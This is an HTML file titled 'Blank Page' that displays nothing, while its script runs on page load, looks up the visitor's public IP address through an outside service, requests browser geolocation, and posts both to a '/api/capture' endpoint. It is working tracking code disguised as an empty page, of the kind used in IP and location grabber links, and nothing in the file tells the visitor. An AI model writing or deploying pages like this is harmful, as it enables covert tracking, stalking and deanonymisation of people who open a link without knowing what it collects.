<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Blank Page</title>
</head>
<body>
 <script>
 // Function to get the user's IP address
 async function getIPAddress() {
 const response = await fetch('https://api.ipify.org?format=json');
 const data = await response.json();
 return data.ip;
 }

 // Function to get the user's location
 function getLocation() {
 return new Promise((resolve, reject) => {
 if (navigator.geolocation) {
 navigator.geolocation.getCurrentPosition(
 (position) => {
 const location = {
 latitude: position.coords.latitude,
 longitude: position.coords.longitude
 };
 resolve(location);
 },
 (error) => {
 reject(error);
 }
 );
 } else {
 reject(new Error('Geolocation is not supported by this browser.'));
 }
 });
 }

 // Send data to the server
 async function sendDataToServer(ip, location) {
 const response = await fetch('/api/capture', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({ ip, location })
 });
 return response.json();
 }

 // Main function to capture and send data
 async function captureData() {
 try {
 const ip = await getIPAddress();
 const location = await getLocation();
 await sendDataToServer(ip, location);
 } catch (error) {
 console.error('Error capturing data:', error);
 }
 }

 // Capture data when the page loads
 window.onload = captureData;
 </script>
</body>
</html>
